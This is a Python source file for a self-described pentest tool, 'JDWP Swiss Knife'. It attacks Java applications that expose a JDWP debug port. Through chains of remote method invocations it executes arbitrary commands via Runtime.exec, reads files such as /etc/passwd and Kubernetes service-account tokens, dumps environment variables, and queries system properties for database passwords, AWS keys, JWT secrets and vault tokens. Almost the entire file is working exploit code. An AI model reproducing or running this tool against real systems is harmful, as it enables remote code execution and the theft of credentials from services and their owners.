#!/usr/bin/env python3

"""
JDWP Swiss Knife — pentest tool for extracting data via JDWP protocol.

All operations happen through Java method invocations over JDWP wire protocol.
No shell needed, no outbound network, no file writes on target.

Usage:
    python3 jdwp-knife.py -t IP -p PORT --env
    python3 jdwp-knife.py -t IP -p PORT --props
    python3 jdwp-knife.py -t IP -p PORT --ls /app
    python3 jdwp-knife.py -t IP -p PORT --cat /etc/passwd
    python3 jdwp-knife.py -t IP -p PORT --cmd "id"
    python3 jdwp-knife.py -t IP -p PORT --all
    python3 jdwp-knife.py -t IP -p PORT --ls / --cat /etc/hosts --env
"""

import socket
import sys
import struct
import argparse
import traceback

################################################################################
# JDWP protocol constants
################################################################################
HANDSHAKE               = b"JDWP-Handshake"
REPLY_PACKET_TYPE       = 0x80

VERSION_SIG             = (1, 1)
ALLCLASSES_SIG          = (1, 3)
IDSIZES_SIG             = (1, 7)
SUSPENDVM_SIG           = (1, 8)
RESUMEVM_SIG            = (1, 9)
CREATESTRING_SIG        = (1, 11)
METHODS_SIG             = (2, 5)
SUPERCLASS_SIG          = (3, 1)
INVOKESTATICMETHOD_SIG  = (3, 3)
NEWINSTANCE_SIG         = (3, 4)
OBJ_REFERENCETYPE_SIG  = (9, 1)
INVOKEMETHOD_SIG        = (9, 6)
STRINGVALUE_SIG         = (10, 1)
EVENTSET_SIG            = (15, 1)
EVENTCLEAR_SIG          = (15, 2)
ARRAY_LENGTH_SIG        = (13, 1)
ARRAY_GETVALUES_SIG     = (13, 2)

MODKIND_LOCATIONONLY    = 7
EVENT_BREAKPOINT        = 2
SUSPEND_EVENTTHREAD     = 1
TAG_OBJECT              = 76
TAG_STRING              = 115
TAG_ARRAY               = 91
TAG_VOID                = 86
TAG_BOOLEAN             = 90
TAG_BYTE                = 66
TAG_INT                 = 73
TAG_LONG                = 74
TYPE_CLASS              = 1


################################################################################
# JDWP Client
################################################################################
class JDWPClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.methods = {}
        self.id = 0x01
        self._class_cache = {}

    # ── Low-level packet I/O ────────────────────────────────────────────────

    def create_packet(self, cmdsig, data=b""):
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIbBB", pktlen, self.id, 0, cmdset, cmd)
        pkt += data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self._recv_exact(11)
        pktlen, rid, flags, errcode = struct.unpack(">IIBH", header)
        if (flags & 0x80) and errcode:
            raise Exception("JDWP error %d (0x%x)" % (errcode, errcode))
        remaining = pktlen - 11
        return self._recv_exact(remaining) if remaining > 0 else b""

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.socket.recv(min(4096, n - len(buf)))
            if not chunk:
                raise Exception("Connection closed")
            buf += chunk
        return buf

    # ── ID formatting ───────────────────────────────────────────────────────

    def fmt(self, size, value):
        if size == 8: return struct.pack(">Q", value)
        elif size == 4: return struct.pack(">I", value)
        else: raise Exception("Unsupported ID size: %d" % size)

    def unfmt(self, size, buf):
        if len(buf) < size:
            raise Exception("unfmt: need %d bytes, got %d" % (size, len(buf)))
        if size == 8: return struct.unpack(">Q", buf[:8])[0]
        elif size == 4: return struct.unpack(">I", buf[:4])[0]
        else: raise Exception("Unsupported ID size: %d" % size)

    def read_tagged_value(self, buf, offset):
        """Read a tagged value from buffer at offset. Returns (value, new_offset, tag)."""
        tag = buf[offset]
        offset += 1
        if tag in (TAG_OBJECT, TAG_STRING, TAG_ARRAY):
            val = self.unfmt(self.objectIDSize, buf[offset:offset+self.objectIDSize])
            return val, offset + self.objectIDSize, tag
        elif tag == TAG_VOID:
            return None, offset, tag
        elif tag == TAG_BOOLEAN:
            return buf[offset], offset + 1, tag
        elif tag == TAG_BYTE:
            return buf[offset], offset + 1, tag
        elif tag == TAG_INT:
            return struct.unpack(">i", buf[offset:offset+4])[0], offset + 4, tag
        elif tag == TAG_LONG:
            return struct.unpack(">q", buf[offset:offset+8])[0], offset + 8, tag
        else:
            # Unknown tag — try objectIDSize as fallback
            val = self.unfmt(self.objectIDSize, buf[offset:offset+self.objectIDSize])
            return val, offset + self.objectIDSize, tag

    # ── Connection ──────────────────────────────────────────────────────────

    def start(self):
        self.handshake()
        self.idsizes()
        self.getversion()
        self.allclasses()

    def handshake(self):
        s = socket.socket()
        s.settimeout(10)
        s.connect((self.host, self.port))
        s.send(HANDSHAKE)
        if s.recv(14) != HANDSHAKE:
            raise Exception("JDWP handshake failed")
        self.socket = s

    def leave(self):
        try: self.socket.close()
        except: pass

    def getversion(self):
        self.socket.sendall(self.create_packet(VERSION_SIG))
        buf = self.read_reply()
        idx = 0
        # description (string)
        l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        self.description = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
        # jdwpMajor, jdwpMinor
        self.jdwpMajor = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        self.jdwpMinor = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        # vmVersion (string)
        l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        self.vmVersion = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
        # vmName (string)
        l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        self.vmName = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def idsizes(self):
        self.socket.sendall(self.create_packet(IDSIZES_SIG))
        buf = self.read_reply()
        self.fieldIDSize = struct.unpack(">I", buf[0:4])[0]
        self.methodIDSize = struct.unpack(">I", buf[4:8])[0]
        self.objectIDSize = struct.unpack(">I", buf[8:12])[0]
        self.referenceTypeIDSize = struct.unpack(">I", buf[12:16])[0]
        self.frameIDSize = struct.unpack(">I", buf[16:20])[0]

    def print_idsizes(self):
        print("[*] ID sizes: field=%d method=%d object=%d refType=%d frame=%d" % (
            self.fieldIDSize, self.methodIDSize, self.objectIDSize,
            self.referenceTypeIDSize, self.frameIDSize))

    # ── Class/Method resolution ─────────────────────────────────────────────

    def allclasses(self):
        if hasattr(self, 'classes'): return self.classes
        self.socket.sendall(self.create_packet(ALLCLASSES_SIG))
        buf = self.read_reply()
        idx = 0
        count = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
        self.classes = []
        for _ in range(count):
            refTypeTag = buf[idx]; idx += 1
            refTypeId = self.unfmt(self.referenceTypeIDSize, buf[idx:idx+self.referenceTypeIDSize])
            idx += self.referenceTypeIDSize
            l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
            sig = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
            status = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
            self.classes.append({"refTypeTag": refTypeTag, "refTypeId": refTypeId,
                                 "signature": sig, "status": status})
        return self.classes

    def get_class(self, sig):
        if sig in self._class_cache: return self._class_cache[sig]
        for entry in self.classes:
            if entry["signature"] == sig:
                self._class_cache[sig] = entry
                return entry
        return None

    def get_methods(self, refTypeId):
        if refTypeId not in self.methods:
            refId = self.fmt(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall(self.create_packet(METHODS_SIG, data=refId))
            buf = self.read_reply()
            idx = 0
            count = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
            methods = []
            for _ in range(count):
                methodId = self.unfmt(self.methodIDSize, buf[idx:idx+self.methodIDSize])
                idx += self.methodIDSize
                l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
                name = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
                l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
                signature = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
                modBits = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
                methods.append({"methodId": methodId, "name": name,
                                "signature": signature, "modBits": modBits})
            self.methods[refTypeId] = methods
        return self.methods[refTypeId]

    def find_method(self, refTypeId, name, signature=None):
        for m in self.methods.get(refTypeId, []):
            if m["name"] == name:
                if signature is None or m["signature"] == signature:
                    return m
        return None

    def get_obj_class(self, objId):
        data = self.fmt(self.objectIDSize, objId)
        self.socket.sendall(self.create_packet(OBJ_REFERENCETYPE_SIG, data=data))
        buf = self.read_reply()
        # Response: refTypeTag(1) + typeID(referenceTypeIDSize)
        refTypeTag = buf[0]
        typeId = self.unfmt(self.referenceTypeIDSize, buf[1:1+self.referenceTypeIDSize])
        return typeId

    # ── String operations ───────────────────────────────────────────────────

    def createstring(self, s):
        if isinstance(s, str): s = s.encode('utf-8')
        buf = struct.pack(">I", len(s)) + s
        self.socket.sendall(self.create_packet(CREATESTRING_SIG, data=buf))
        buf = self.read_reply()
        objId = self.unfmt(self.objectIDSize, buf[:self.objectIDSize])
        return objId

    def solve_string(self, objId):
        if isinstance(objId, int):
            objId = self.fmt(self.objectIDSize, objId)
        self.socket.sendall(self.create_packet(STRINGVALUE_SIG, data=objId))
        buf = self.read_reply()
        if not buf: return ""
        size = struct.unpack(">I", buf[:4])[0]
        return buf[4:4+size].decode('utf-8', errors='replace')

    def make_string_arg(self, s):
        objId = self.createstring(s)
        return bytes([TAG_OBJECT]) + self.fmt(self.objectIDSize, objId), objId

    # ── VM control ──────────────────────────────────────────────────────────

    def suspendvm(self):
        self.socket.sendall(self.create_packet(SUSPENDVM_SIG)); self.read_reply()

    def resumevm(self):
        self.socket.sendall(self.create_packet(RESUMEVM_SIG)); self.read_reply()

    # ── Invocations ─────────────────────────────────────────────────────────

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.fmt(self.referenceTypeIDSize, classId)
        data += self.fmt(self.objectIDSize, threadId)
        data += self.fmt(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for a in args: data += a
        data += struct.pack(">I", 0)
        self.socket.sendall(self.create_packet(INVOKESTATICMETHOD_SIG, data=data))
        return self.read_reply()

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.fmt(self.objectIDSize, objId)
        data += self.fmt(self.objectIDSize, threadId)
        data += self.fmt(self.referenceTypeIDSize, classId)
        data += self.fmt(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for a in args: data += a
        data += struct.pack(">I", 0)
        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))
        return self.read_reply()

    def newinstance(self, classId, threadId, methId, *args):
        data = self.fmt(self.referenceTypeIDSize, classId)
        data += self.fmt(self.objectIDSize, threadId)
        data += self.fmt(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for a in args: data += a
        data += struct.pack(">I", 0)
        self.socket.sendall(self.create_packet(NEWINSTANCE_SIG, data=data))
        return self.read_reply()

    # ── Array operations ────────────────────────────────────────────────────

    def array_length(self, arrayId):
        data = self.fmt(self.objectIDSize, arrayId)
        self.socket.sendall(self.create_packet(ARRAY_LENGTH_SIG, data=data))
        buf = self.read_reply()
        return struct.unpack(">I", buf[:4])[0]

    def array_getvalues(self, arrayId, first, length):
        data = self.fmt(self.objectIDSize, arrayId)
        data += struct.pack(">II", first, length)
        self.socket.sendall(self.create_packet(ARRAY_GETVALUES_SIG, data=data))
        return self.read_reply()

    def read_object_array(self, arrayId, length):
        """Read an array of object references. Returns list of objectIds."""
        buf = self.array_getvalues(arrayId, 0, length)
        # ArrayRegion format: tag(1) + length(4) + elements
        # Each element for object arrays: tag(1) + objectId(objectIDSize)
        tag = buf[0]
        arrLen = struct.unpack(">I", buf[1:5])[0]
        offset = 5
        result = []
        for i in range(arrLen):
            eTag = buf[offset]; offset += 1
            eId = self.unfmt(self.objectIDSize, buf[offset:offset+self.objectIDSize])
            offset += self.objectIDSize
            result.append(eId)
        return result

    def read_string_array(self, arrayId, length):
        """Read an array of String references and resolve them. Returns list of strings."""
        objIds = self.read_object_array(arrayId, length)
        result = []
        for oid in objIds:
            if oid == 0:
                result.append("<null>")
            else:
                result.append(self.solve_string(oid))
        return result

    def read_byte_array(self, arrayId, length):
        """Read a byte[] array. Returns bytes."""
        buf = self.array_getvalues(arrayId, 0, length)
        # ArrayRegion for byte[]: tag(1=TAG_BYTE) + length(4) + raw bytes
        tag = buf[0]
        arrLen = struct.unpack(">I", buf[1:5])[0]
        return buf[5:5+arrLen]

    # ── Event / breakpoint ──────────────────────────────────────────────────

    def send_event(self, eventCode, *args):
        data = bytes([eventCode, SUSPEND_EVENTTHREAD])
        data += struct.pack(">I", len(args))
        for kind, option in args:
            data += bytes([kind]) + option
        self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
        return struct.unpack(">I", self.read_reply())[0]

    def clear_event(self, eventCode, rId):
        data = bytes([eventCode]) + struct.pack(">I", rId)
        self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
        self.read_reply()

    def wait_for_event(self):
        return self.read_reply()

    def parse_event_breakpoint(self, buf, eventId):
        if len(buf) < 10 + self.objectIDSize: return None
        numEvents = struct.unpack(">I", buf[1:5])[0]
        if numEvents < 1: return None
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId: return None
        tId = self.unfmt(self.objectIDSize, buf[10:10+self.objectIDSize])
        return rId, tId

    # ── High-level helpers ──────────────────────────────────────────────────

    def get_superclass(self, classId):
        data = self.fmt(self.referenceTypeIDSize, classId)
        self.socket.sendall(self.create_packet(SUPERCLASS_SIG, data=data))
        buf = self.read_reply()
        if len(buf) < self.referenceTypeIDSize: return 0
        return self.unfmt(self.referenceTypeIDSize, buf)

    def find_method_up(self, classId, name, sig=None):
        """Find method walking up the class hierarchy. Returns (method, classId) or (None, None)."""
        cid = classId
        visited = set()
        while cid and cid not in visited:
            visited.add(cid)
            if cid not in self.methods:
                self.get_methods(cid)
            m = self.find_method(cid, name, sig)
            if m:
                return m, cid
            cid = self.get_superclass(cid)
        return None, None

    def exec_with_output(self, tId, command):
        """Execute command via Runtime.exec() and capture stdout through JDWP invocations.
        No NewInstance, no shell, no outbound network — pure JDWP invoke chain."""

        # Increase socket timeout for potentially slow commands
        old_timeout = self.socket.gettimeout()
        self.socket.settimeout(30)

        try:
            # 1. Runtime.getRuntime()
            rtCls = self.get_class("Ljava/lang/Runtime;")
            if not rtCls: raise Exception("Runtime class not found")
            rtCid = rtCls["refTypeId"]
            self.get_methods(rtCid)

            getRtMeth = self.find_method(rtCid, "getRuntime")
            if not getRtMeth: raise Exception("getRuntime() not found")
            buf = self.invokestatic(rtCid, tId, getRtMeth["methodId"])
            rtId, _, _ = self.read_tagged_value(buf, 0)

            # 2. runtime.exec(command) → Process
            execMeth = self.find_method(rtCid, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
            if not execMeth: raise Exception("exec(String) not found")
            cmdArg, _ = self.make_string_arg(command)
            buf = self.invoke(rtId, tId, rtCid, execMeth["methodId"], cmdArg)
            procId, _, _ = self.read_tagged_value(buf, 0)
            if not procId: raise Exception("exec() returned null")

            # 3. process.getInputStream() → InputStream
            procCid = self.get_obj_class(procId)
            gisMeth, gisCid = self.find_method_up(procCid, "getInputStream")
            if not gisMeth: raise Exception("getInputStream() not found")
            buf = self.invoke(procId, tId, gisCid, gisMeth["methodId"])
            isId, _, _ = self.read_tagged_value(buf, 0)
            if not isId: raise Exception("getInputStream() returned null")

            # 4. inputStream.readAllBytes() → byte[]
            #    (blocks until process exits, Java 9+)
            isCid = self.get_obj_class(isId)
            rabMeth, rabCid = self.find_method_up(isCid, "readAllBytes")
            if not rabMeth: raise Exception("readAllBytes() not found (need Java 9+)")
            buf = self.invoke(isId, tId, rabCid, rabMeth["methodId"])
            baId, _, tag = self.read_tagged_value(buf, 0)

            if not baId or tag == TAG_VOID:
                return ""

            # 5. Read byte[] via JDWP ArrayReference.GetValues
            arrLen = self.array_length(baId)
            if arrLen == 0: return ""
            raw = self.read_byte_array(baId, arrLen)
            return raw.decode('utf-8', errors='replace')

        finally:
            self.socket.settimeout(old_timeout)

    def call_tostring(self, objId, threadId):
        classId = self.get_obj_class(objId)
        if classId not in self.methods:
            self.get_methods(classId)
        m = self.find_method(classId, "toString")
        if not m: return "<no toString>"
        buf = self.invoke(objId, threadId, classId, m["methodId"])
        val, _, tag = self.read_tagged_value(buf, 0)
        if tag == TAG_STRING and val != 0:
            return self.solve_string(val)
        return "<non-string result>"

    def invoke_and_get_obj(self, objId, threadId, methodName, sig=None, *args):
        classId = self.get_obj_class(objId)
        if classId not in self.methods:
            self.get_methods(classId)
        m = self.find_method(classId, methodName, sig)
        if not m:
            raise Exception("Method '%s' not found on class %x" % (methodName, classId))
        buf = self.invoke(objId, threadId, classId, m["methodId"], *args)
        val, _, tag = self.read_tagged_value(buf, 0)
        return val

    def create_file_object(self, threadId, path):
        fileCls = self.get_class("Ljava/io/File;")
        if not fileCls: raise Exception("java.io.File not found")
        fid = fileCls["refTypeId"]
        self.get_methods(fid)
        ctor = self.find_method(fid, "<init>", "(Ljava/lang/String;)V")
        if not ctor: raise Exception("File(String) constructor not found")
        pathArg, _ = self.make_string_arg(path)
        buf = self.newinstance(fid, threadId, ctor["methodId"], pathArg)

        # NewInstance response varies by JVM:
        # Standard: tag(1) + objectId(N) + excTag(1) + excId(N) = 2*(1+N) bytes
        # Some JVMs: objectId(N) only = N bytes
        expected_full = 2 * (1 + self.objectIDSize)

        if len(buf) >= expected_full:
            # Standard tagged format
            objId, offset, tag = self.read_tagged_value(buf, 0)
            excId, _, _ = self.read_tagged_value(buf, offset)
            if excId != 0:
                excMsg = self.call_tostring(excId, threadId)
                raise Exception("File() threw: %s" % excMsg)
        elif len(buf) >= self.objectIDSize:
            # Untagged format — just objectId
            objId = self.unfmt(self.objectIDSize, buf[0:self.objectIDSize])
        else:
            raise Exception("NewInstance: unexpected response (%d bytes)" % len(buf))

        if objId == 0:
            raise Exception("NewInstance returned null")

        return objId, fid


################################################################################
# Breakpoint
################################################################################
def str2fqclass(s):
    i = s.rfind('.')
    if i == -1: sys.exit("Cannot parse method path: %s" % s)
    return 'L' + s[:i].replace('.', '/') + ';', s[i+1:]

def setup_breakpoint(jdwp, break_on):
    classname, method = str2fqclass(break_on)
    c = jdwp.get_class(classname)
    if not c: raise Exception("Class %s not found" % classname)
    jdwp.get_methods(c["refTypeId"])
    m = jdwp.find_method(c["refTypeId"], method)
    if not m: raise Exception("Method %s not found" % method)

    loc = bytes([TYPE_CLASS])
    loc += jdwp.fmt(jdwp.referenceTypeIDSize, c["refTypeId"])
    loc += jdwp.fmt(jdwp.methodIDSize, m["methodId"])
    loc += struct.pack(">II", 0, 0)

    rId = jdwp.send_event(EVENT_BREAKPOINT, (MODKIND_LOCATIONONLY, loc))
    print("[*] Breakpoint set (id=%x), waiting..." % rId)
    jdwp.resumevm()

    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None: break

    rId, tId = ret
    print("[+] Breakpoint hit, thread=%#x" % tId)
    jdwp.clear_event(EVENT_BREAKPOINT, rId)
    return tId


################################################################################
# --env : System.getenv() via toString() fallback-first (most reliable)
################################################################################
def do_env(jdwp, tId):
    print("\n" + "="*70)
    print(" ENVIRONMENT VARIABLES  [System.getenv()]")
    print("="*70 + "\n")

    sysCls = jdwp.get_class("Ljava/lang/System;")
    if not sysCls: return print("[-] System class not found")
    sid = sysCls["refTypeId"]
    jdwp.get_methods(sid)

    m = jdwp.find_method(sid, "getenv", "()Ljava/util/Map;")
    if not m: return print("[-] getenv() not found")

    buf = jdwp.invokestatic(sid, tId, m["methodId"])
    mapId, _, tag = jdwp.read_tagged_value(buf, 0)
    if mapId == 0: return print("[-] getenv() returned null")
    print("[+] Got env Map (id:%#x)" % mapId)

    # Approach 1: try entrySet().toArray() + individual toString()
    try:
        setId = jdwp.invoke_and_get_obj(mapId, tId, "entrySet")
        arrayId = jdwp.invoke_and_get_obj(setId, tId, "toArray", "()[Ljava/lang/Object;")
        arrLen = jdwp.array_length(arrayId)
        print("[+] %d env variables\n" % arrLen)

        entryIds = jdwp.read_object_array(arrayId, arrLen)
        results = []
        for i, eId in enumerate(entryIds):
            if eId == 0:
                continue
            try:
                val = jdwp.call_tostring(eId, tId)
                results.append(val)
                print("  %s" % val)
            except Exception as e:
                print("  [err entry %d: %s]" % (i, e))
        return results

    except Exception as e:
        print("[!] entrySet path failed: %s" % e)
        print("[!] Falling back to Map.toString()...\n")

    # Approach 2: map.toString() — returns {KEY=val, KEY2=val2, ...}
    try:
        val = jdwp.call_tostring(mapId, tId)
        # Parse {K=V, K2=V2, ...}
        if val.startswith("{") and val.endswith("}"):
            inner = val[1:-1]
            for pair in inner.split(", "):
                print("  %s" % pair)
        else:
            print(val)
        return [val]
    except Exception as e:
        print("[-] toString() also failed: %s" % e)
        return []


################################################################################
# --props : System.getProperty()
################################################################################
def do_props(jdwp, tId):
    print("\n" + "="*70)
    print(" SYSTEM PROPERTIES  [System.getProperty()]")
    print("="*70 + "\n")

    props = [
        "java.version", "java.vendor", "java.home", "java.vm.version",
        "java.vm.name", "java.class.path", "java.library.path", "java.io.tmpdir",
        "os.name", "os.arch", "os.version",
        "user.name", "user.home", "user.dir",
        "spring.application.name", "spring.profiles.active",
        "spring.datasource.url", "spring.datasource.username", "spring.datasource.password",
        "spring.kafka.bootstrap-servers", "spring.kafka.properties.sasl.jaas.config",
        "spring.redis.host", "spring.redis.password",
        "spring.cloud.config.uri", "spring.cloud.config.token",
        "server.port", "management.server.port",
        "db.password", "db.url", "db.username",
        "api.key", "api.secret", "jwt.secret",
        "aws.accessKeyId", "aws.secretKey", "vault.token",
    ]

    sysCls = jdwp.get_class("Ljava/lang/System;")
    if not sysCls: return print("[-] System class not found")
    sid = sysCls["refTypeId"]
    jdwp.get_methods(sid)

    m = jdwp.find_method(sid, "getProperty", "(Ljava/lang/String;)Ljava/lang/String;")
    if not m: return print("[-] getProperty() not found")

    results = {}
    for prop in props:
        try:
            arg, _ = jdwp.make_string_arg(prop)
            buf = jdwp.invokestatic(sid, tId, m["methodId"], arg)
            val, _, tag = jdwp.read_tagged_value(buf, 0)
            if tag == TAG_STRING and val != 0:
                res = jdwp.solve_string(val)
                results[prop] = res
                print("  %-45s = %s" % (prop, res))
        except:
            pass
    return results


################################################################################
# --ls PATH : via Runtime.exec("ls -1a") + stdout capture through JDWP
################################################################################
def do_ls(jdwp, tId, path):
    print("\n" + "="*70)
    print(" DIRECTORY LISTING  [%s]" % path)
    print("="*70 + "\n")

    output = jdwp.exec_with_output(tId, "ls -1a %s" % path)
    if not output:
        print("[-] Empty output (not a directory or access denied)")
        return []

    entries = output.strip().split('\n')
    print("[+] %d entries\n" % len(entries))
    for e in entries:
        print("  %s" % e)
    return entries


################################################################################
# --cat FILE : via Runtime.exec("cat") + stdout capture through JDWP
################################################################################
def do_cat(jdwp, tId, path):
    print("\n" + "="*70)
    print(" FILE CONTENTS  [%s]" % path)
    print("="*70 + "\n")

    output = jdwp.exec_with_output(tId, "cat %s" % path)
    if not output:
        print("[-] Empty output (file not found or access denied)")
        return

    print(output)
    return output


################################################################################
# --cmd : Runtime.exec() (fire-and-forget)
################################################################################
def do_cmd(jdwp, tId, command):
    print("\n" + "="*70)
    print(" EXEC  [%s]" % command)
    print("="*70 + "\n")

    rtCls = jdwp.get_class("Ljava/lang/Runtime;")
    if not rtCls: return print("[-] Runtime not found")
    rid = rtCls["refTypeId"]
    jdwp.get_methods(rid)

    getRtMeth = jdwp.find_method(rid, "getRuntime")
    if not getRtMeth: return print("[-] getRuntime() not found")

    buf = jdwp.invokestatic(rid, tId, getRtMeth["methodId"])
    rtObj, _, _ = jdwp.read_tagged_value(buf, 0)

    execMeth = jdwp.find_method(rid, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
    if not execMeth: return print("[-] exec(String) not found")

    cmdArg, _ = jdwp.make_string_arg(command)
    buf = jdwp.invoke(rtObj, tId, rid, execMeth["methodId"], cmdArg)
    procId, _, tag = jdwp.read_tagged_value(buf, 0)
    print("[+] exec() returned Process id:%#x (fire-and-forget)" % procId)


################################################################################
# --all : full enum
################################################################################
KEY_FILES = [
    "/etc/hostname", "/etc/hosts", "/etc/resolv.conf",
    "/proc/self/cgroup", "/proc/1/cmdline", "/proc/self/mountinfo",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/root/.bashrc",
    "/app/application.yml", "/app/application.properties",
    "/opt/wrapper-3.5.60/conf/wrapper.conf",
]

KEY_DIRS = ["/", "/app", "/tmp", "/root",
            "/var/run/secrets/kubernetes.io/serviceaccount"]


def do_all(jdwp, tId):
    do_props(jdwp, tId)
    do_env(jdwp, tId)
    for d in KEY_DIRS:
        try: do_ls(jdwp, tId, d)
        except Exception as e: print("[-] ls %s: %s" % (d, e))
    for f in KEY_FILES:
        try: do_cat(jdwp, tId, f)
        except Exception as e: print("[-] cat %s: %s" % (f, e))


################################################################################
# Main
################################################################################
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="JDWP Swiss Knife",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t TARGET -p 5005 --env
  %(prog)s -t TARGET -p 5005 --props
  %(prog)s -t TARGET -p 5005 --ls /app --ls /tmp
  %(prog)s -t TARGET -p 5005 --cat /etc/passwd
  %(prog)s -t TARGET -p 5005 --all -o dump.txt
""")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=5005)
    parser.add_argument("--break-on", default="java.lang.Thread.sleep")
    parser.add_argument("--env", action="store_true", help="Dump env vars")
    parser.add_argument("--props", action="store_true", help="Dump system properties")
    parser.add_argument("--ls", action="append", metavar="PATH", help="List directory")
    parser.add_argument("--cat", action="append", metavar="FILE", help="Read file")
    parser.add_argument("--cmd", type=str, help="Execute command")
    parser.add_argument("--all", action="store_true", help="Full enumeration")
    parser.add_argument("-o", "--output", type=str, help="Save output to file")

    args = parser.parse_args()

    if not any([args.env, args.props, args.ls, args.cat, args.cmd, args.all]):
        args.props = True

    if args.output:
        class Tee:
            def __init__(self, *streams):
                self.streams = streams
            def write(self, data):
                for s in self.streams: s.write(data); s.flush()
            def flush(self):
                for s in self.streams: s.flush()
        logfile = open(args.output, 'w')
        sys.stdout = Tee(sys.__stdout__, logfile)

    cli = None
    retcode = 0

    try:
        cli = JDWPClient(args.target, args.port)
        cli.start()
        print("[+] Connected: %s" % cli.version)
        cli.print_idsizes()

        tId = setup_breakpoint(cli, args.break_on)

        if args.all:
            do_all(cli, tId)
        else:
            if args.props: do_props(cli, tId)
            if args.env: do_env(cli, tId)
            if args.ls:
                for p in args.ls:
                    try: do_ls(cli, tId, p)
                    except Exception as e: print("[-] ls %s: %s" % (p, e))
            if args.cat:
                for p in args.cat:
                    try: do_cat(cli, tId, p)
                    except Exception as e: print("[-] cat %s: %s" % (p, e))
            if args.cmd: do_cmd(cli, tId, args.cmd)

        cli.resumevm()
        print("\n[+] Done. VM resumed.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print("[-] Exception: %s" % e)
        traceback.print_exc()
        retcode = 1
    finally:
        if cli:
            try: cli.resumevm()
            except: pass
            cli.leave()
        if args.output: logfile.close()

    sys.exit(retcode)
